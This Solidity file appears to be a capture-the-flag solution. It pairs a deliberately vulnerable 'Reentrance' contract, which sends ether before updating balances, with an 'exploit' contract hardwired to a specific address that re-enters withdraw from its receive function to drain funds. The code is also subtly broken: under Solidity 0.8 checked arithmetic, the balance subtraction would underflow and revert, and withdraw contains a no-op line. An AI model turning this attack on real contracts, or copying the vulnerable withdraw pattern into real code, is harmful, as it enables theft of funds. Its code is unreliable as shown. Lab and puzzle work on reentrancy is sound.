// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Reentrance {
    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] += msg.value;
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract exploit {
    Reentrance target = Reentrance(payable(0x5558BaF1B55d9F252EeFaeaea3E919070Ca59996));

    function attack() public payable {
        target.donate{value: 0.001 ether}(address(this));
        target.withdraw(0.001 ether);
    }

    receive() external payable {
        target.withdraw(0.001 ether);
    }
}